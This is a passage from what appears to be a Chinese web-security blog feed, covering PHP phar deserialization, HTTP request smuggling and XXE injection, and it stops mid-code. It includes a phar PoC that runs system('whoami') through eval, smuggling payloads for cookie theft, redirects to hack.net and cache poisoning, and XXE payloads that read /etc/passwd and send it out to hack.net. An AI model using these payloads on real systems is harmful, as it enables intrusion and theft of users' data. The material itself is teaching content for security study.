class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$path = <span class="string">&#x27;phar://test.phar&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>($path);</span><br><span class="line">file_exists($path);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $call;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call = <span class="keyword">new</span> Run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> Control();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新的test.phar文件</span></span><br><span class="line">@unlink(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="comment">// 开始初始化过程</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">// 添加要打包压缩的文件</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入伪装过的头部标识</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入Meta-data并序列化</span></span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line"><span class="comment">// 生成phar文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>附上l1nk3r师傅总结的常用魔术方法触发条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()      <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep()       <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct()    <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call()        <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic()  <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get()         <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set()         <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset()       <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset()       <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString()    <span class="comment">//把类当作字符串使用时触发,返回值需要为字符串</span></span><br><span class="line">__invoke()      <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和&lt;code&gt;phar://&lt;/code&gt;伪协议可以对phar文件进行读写等操作，如果 &lt;code&gt;phar.readonly&lt;/code&gt; 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="phar" scheme="https://hosch3n.github.io/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私</title>
    <link href="https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2020-08-16T14:29:15.000Z</published>
    <updated>2021-03-01T09:44:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）</p><p>一种是通过 <code>Content-Length</code> 请求头 的值界定请求体的长度，另一种是在<a href="https://zh.wikipedia.org/zh-hans/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81">分块传输</a>时，通过 <code>Transfer-Encoding: chunked</code> 请求头与请求体最后一行的 <code>0\r\n\r\n</code> 来标识该请求的结束(不计入请求体长度)</p><p>按照<a href="https://tools.ietf.org/html/rfc2616#section-4.4">HTTP/1.1规范标准</a>，这两种请求头同时存在时应该忽略 <code>Content-Length</code> 而以分块传输为准，但是对于反代链中的多个服务器而言，可能有些并不支持分块传输请求头、有些对于标准规范的实现并未足够精细，在处理一些畸形请求头时会有非预期的效果。</p><blockquote><p>为了方便表述，接下来均将用于反向代理的服务器称为前端，隐藏在反代服务器之后用于提供具体业务的服务器称为后端。用 <code>CL-TE</code> 表示前端以 <code>Content-Length</code> 作为请求结束界定标准、<code>TE-CL</code> 表示前端以 <code>Transfer-Encoding</code> 作为请求结束界定标准。</p></blockquote><p>HTTP请求走私漏洞正是由于前后端服务器界定标准不一致导致的，利用HTTP请求走私使得 <code>一次攻击</code> 在前端服务器识别为 <code>一个请求</code> ，但传送到后端服务器时其误认为这是用了<a href="https://zh.wikipedia.org/zh-cn/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96">pipelining</a>，而将其识别为 <code>两个不同的请求</code>。</p><ul><li>更深入的细节原理，涉及到反代和后端对于消息的处理机制，这部分现在还不懂，以后懂了再单独分析</li></ul><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 50</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端读取 <code>CL</code> 值为50，会将这一整段视为一个请求转发至后端( <code>0</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>后端接收时以 <code>TE</code> 作为界定标准，将 <code>0\r\n\r\n</code> 视为一个请求的结束，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的包结构并不完整，所以后端认为这份数据还没有接收完毕，会继续将随后到来的请求拼接进去</p></li><li><p>注意 <code>CL</code> 取值为50时，是截止到最后一行的最后一个字母 <code>t</code> 的，也就是说 <code>t</code> 后面并不存在 <code>\r\n</code> 这对回车换行符，那么后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 11</span><br><span class="line"></span><br><span class="line">q=something</span><br></pre></td></tr></table></figure><p>这就导致了后续对 <code>/search</code> 的访问，因为请求行被吃进了 <code>X-Ignore</code> 这个请求头的值中，拼接后实际变成了对 <code>/404</code> 的访问。</p><p>从理论上来说，我们可以发出请求走私攻击包后，紧接着发送一个正常请求，根据后者不正常的响应差异来判断漏洞存在。</p><p>在实战中我们的攻击请求和紧接着发送的正常请求之间，很可能会有其他人的某个请求刚好插在了中间，这样我们本来期待用于判断漏洞的不正常响应就会被回复给别人，影响别人正常使的同时还会导致我们误以为没洞，所以最好避开高峰期多试几次。</p><ul><li>或者<a href="https://portswigger.net/web-security/request-smuggling/finding">基于响应时间来判断</a></li></ul><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span>: 13</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端以 <code>TE</code> 作为界定标准，会将这一整段视为一个请求转发至后端( <code>q=something</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>前端读取 <code>CL</code> 值为13，认为第一个请求截止到 <code>q=something</code>，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的 <code>CL</code> 值为15，所以后端认为这份数据还没有接收完毕，会继续在随后到来的请求中取出5个字符拼接进去</p></li><li><p>后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">POST[空格]</span></span><br></pre></td></tr></table></figure><p>于是就使得后续请求被截断，剩下的不完整部分会被视为无效请求丢弃，最终会得到一个不正常的响应。（同样存在前文中说的竞争问题，缓解方法一样）</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>从原理来看前后端标准一致时是不存在请求走私的，但如果一个接受畸形 <code>TE</code> 认为是分块传输，一个不接受畸形 <code>TE</code> 而按照 <code>CL</code> 的值作为请求结束界定标准，这种细微差异同样会导致请求走私，PortSwigger 提供了部分在实战中成功利用过的畸形头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: xchunked</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding : chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: x</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding:[tab]chunked</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span></span><br><span class="line"><span class="attribute"></span>: chunked</span><br></pre></td></tr></table></figure><ul><li>在<a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">Burp插件</a>中存在更多畸形 <code>TE</code> 头用于Fuzz，可以自动计算 <code>CL</code> 长度和配合 <code>Turbo Intruder</code> 光速发包，真香</li></ul><p>利用畸形 <code>TE</code> 导致的差异化解析，最终还是会对应 <code>CL-TE</code> 或 <code>TE-CL</code> 的情况，就不再贴数据包了(就是改一下 <code>TE</code> 头)。</p><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>最直接的就是用来绕过前端的安全访问控制，让走私的请求直达业务逻辑后端。但是实战中可能没有这么理想化，比如后端还是会校验 <code>client-ip</code> 、 <code>x-forwarded-for</code> 或是反代加的自定义请求头，这时就需要找到一个能够回显请求体参数的地方，利用请求走私中的第二个 <code>不完整</code> 请求吃掉紧接而来的下一个请求，通过直接或间接的回显读到需要的请求头。</p><p>比如在一个搜索功能中，POST请求的 <code>q</code> 参数的内容表示搜索的字符串，这个字符串在搜索页会被 <code>直接回显</code> 或是存储到搜索记录中 <code>间接回显</code>。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 159</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 200</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=something</span><br></pre></td></tr></table></figure><p>重点注意第二个走私请求中 <code>CL</code> 值被设置得偏大，且有回显的 <code>q</code> 参数被移到了末尾，后端随后紧接而来的请求实际上会被拼接成这种样子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 100</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=somethingPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xx.net</span><br><span class="line"><span class="attribute">X-Secret-Header</span>: 666</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>...</code>中有多少内容取决于走私请求中 <code>CL</code> 值的大小，建议根据需要慢慢调大，避免过大导致超时(在这个例子中我们已经读到了需要的 <code>X-Secret-Header: 666</code> 这个前端服务器自定义校验头)，但是调大 <code>CL</code> 值能读到的东西最多截止到遇到 <code>&amp;</code> 时（想想HTTP请求用什么符号区分不同参数？我们能回显什么参数？）</p><p>至于这个 <code>随后紧接而来的请求</code> 该由我们发出，还是守株待兔等着别人的访问请求进坑，就要看具体的目的是什<br>么了。</p><h3 id="窃取Cookie"><a href="#窃取Cookie" class="headerlink" title="窃取Cookie"></a>窃取Cookie</h3><p>如果是想要打到别人的私有请求头(比如 <code>Cookie</code> 之类的)，那就得等人进坑且需要一个存储型的间接回显点，因为一次性的直接回显会直接响应给受害者，我们是看不到的。</p><ul><li>存储型间接回显点举例:搜索记录、个人简介、发布文章、发布评论、发送私信</li></ul><h3 id="水坑型XSS"><a href="#水坑型XSS" class="headerlink" title="水坑型XSS"></a>水坑型XSS</h3><p>如果实在没有存储型间接回显点的话，那就充分利用一次性直接回显这个特点，配合一个反射型XSS使其变为无条件触发的 <code>水坑型XSS</code> （我自己编的名）</p><ul><li>反射型XSS漏洞点可以是常规的GET或POST参数，同样也可以是像 <code>User-Agent</code> 头这种self触发点，因为结合请求走私我们可以实现将它强加给下一个访问的受害者</li></ul><h3 id="任意重定向"><a href="#任意重定向" class="headerlink" title="任意重定向"></a>任意重定向</h3><p>如果配合 <code>Apache</code> 和 <code>IIS</code> 会将无斜杠路径通过重定向方式添加斜杠的特性，就可以再次利用请求走私给下一个访问的受害者强加头部，通过重定向将其劫持到任意域名下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /evil HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/evil</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /a.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存投毒"><a href="#Web缓存投毒" class="headerlink" title="Web缓存投毒"></a>Web缓存投毒</h3><p>同时，对于 <code>/a.js</code> 的访问请求还可能被缓存下来，使得之后每个不受请求走私影响的后续请求，同样受到重定向劫持的影响，进一步造成Web缓存投毒：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/a.js</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存水坑"><a href="#Web缓存水坑" class="headerlink" title="Web缓存水坑"></a>Web缓存水坑</h3><p>回过头来，之前没找到回显点打敏感数据的话，也可以再再次利用请求走私给下一个访问的受害者强加头部，结合Web缓存特性将其敏感数据缓存下来窃取。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /getapikey HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/getapikey</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /any.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line"><span class="attribute">Cookie</span>: sessionId=balabalabala</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>受害者的 <code>/getapikey</code> 中的信息会被缓存至 <code>/any.js</code> 中，但是一个问题是攻击者并不知道受害者是访问的 <code>/any.js</code>，所以可能需要遍历几乎所有静态文件分析= =</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）&lt;/p&gt;
&lt;p&gt;一种是通过 &lt;code&gt;Content-Length&lt;/code&gt; 请求头 的值界定请求体的长度，另一种是在&lt;a href=&quot;https://zh.wikip</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="http" scheme="https://hosch3n.github.io/tags/http/"/>
    
    <category term="smuggling" scheme="https://hosch3n.github.io/tags/smuggling/"/>
    
  </entry>
  
  <entry>
    <title>XML基础与XXE注入</title>
    <link href="https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/"/>
    <id>https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/</id>
    <published>2020-08-16T13:32:00.000Z</published>
    <updated>2021-03-01T09:43:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML是一种被设计用来存储和传输数据的语言，叫作<em>可扩展标记语言</em>，通过自定义标签的形式描述数据。</p><h3 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h3><p>为了区分开表示数据的尖括号和表示结构的标签，在数据中用<code>&amp;lt;</code>和<code>&amp;gt;</code>这类预定义的XML实体来表示左右尖括号。</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>XML通过头部的DTD（文档类型定义）来定义文档结构，实际内容直接写在文档里的DTD叫作<code>内部DTD</code>，实际内容放在外面，要通过引用加载的DTD叫作<code>外部DTD</code>，二者可以在XML中混用。</p><h3 id="自定义实体"><a href="#自定义实体" class="headerlink" title="自定义实体"></a>自定义实体</h3><p>如果预定义的XML实体不够用，就可以自定义新的XML实体：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY id &quot;hosch3n&quot; &gt; ]&gt;</code></p><p>这样就可以用<code>&amp;id;</code>表示<code>hosch3n</code>这个值。</p><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>自定义实体的实际内容不一定要写在DTD里，也可以写在外面然后通过引用加载：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY ext SYSTEM &quot;http://xxx.com&quot; &gt; ]&gt;</code></p><ul><li>支持http、ftp、file等协议</li></ul><h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="OAST"><a href="#OAST" class="headerlink" title="OAST"></a>OAST</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;hack.net&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 